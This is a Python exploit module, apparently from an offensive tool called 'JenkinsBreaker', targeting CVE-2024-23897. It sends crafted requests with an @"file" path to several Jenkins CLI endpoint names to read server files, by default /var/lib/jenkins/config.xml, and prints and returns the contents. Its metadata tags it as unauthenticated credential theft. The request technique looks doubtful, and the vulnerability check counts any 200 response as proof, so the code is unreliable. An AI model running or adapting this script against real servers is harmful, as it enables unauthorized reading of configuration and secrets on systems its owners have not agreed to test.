"""
CVE-2024-23897: Jenkins CLI Arbitrary File Read

This exploit leverages the Jenkins CLI to read arbitrary files from the Jenkins server
using the @file syntax in CLI commands.
"""

import requests
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2024-23897"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Jenkins CLI Arbitrary File Read",
    description="Arbitrary file read via Jenkins CLI @file syntax",
    affected_versions=["<= 2.441", "<= 2.426.2 LTS"],
    mitre_attack=["T1190", "T1552.001"],
    severity="high",
    references=[
        "https://www.jenkins.io/security/advisory/2024-01-24/",
        "https://nvd.nist.gov/vuln/detail/CVE-2024-23897"
    ],
    requires_auth=False,
    requires_crumb=False,
    tags=["file-read", "information-disclosure", "cli"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance is vulnerable.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    try:
        url = f"{tool.jenkins_url}/cli"
        r = requests.get(url, verify=False, timeout=5)
        return r.status_code == 200
    except:
        return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2024-23897 for arbitrary file reading.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Listener host (unused for this exploit)
        lport: Listener port (unused for this exploit)
        **kwargs: Additional arguments
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (Arbitrary File Read)...[/yellow]")
    
    file_path = kwargs.get('file_path', '/var/lib/jenkins/config.xml')
    cli_endpoints = ["who-am-i", "connect-node", "enable-job", "keep-build"]
    
    for cli in cli_endpoints:
        url = f"{tool.jenkins_url}/{cli}/@\"{file_path}\""
        try:
            r = requests.get(
                url, 
                auth=tool.auth, 
                headers=tool.custom_headers, 
                proxies=tool.proxies, 
                verify=False,
                timeout=10
            )
            
            if r.status_code == 200:
                content = r.content.decode('utf-8', errors='ignore')
                console.print(f"[green][+] File read successful via {cli}[/green]")
                console.print(f"[green][+] File content ({len(content)} bytes):\n{content[:300]}...[/green]")
                
                return ExploitResult(
                    exploit=CVE_ID,
                    status="success",
                    details=f"File read successfully via {cli}",
                    data={
                        "file_path": file_path,
                        "content_length": len(content),
                        "content_preview": content[:500],
                        "endpoint": cli
                    }
                )
            elif r.status_code == 403:
                console.print(f"[red][-] {cli} blocked by permissions or CSRF[/red]")
            else:
                console.print(f"[red][-] {cli} failed ({r.status_code})[/red]")
                
        except Exception as e:
            console.print(f"[red][!] {cli} error: {e}[/red]")
    
    return ExploitResult(
        exploit=CVE_ID,
        status="failed",
        details="File read failed on all endpoints"
    )
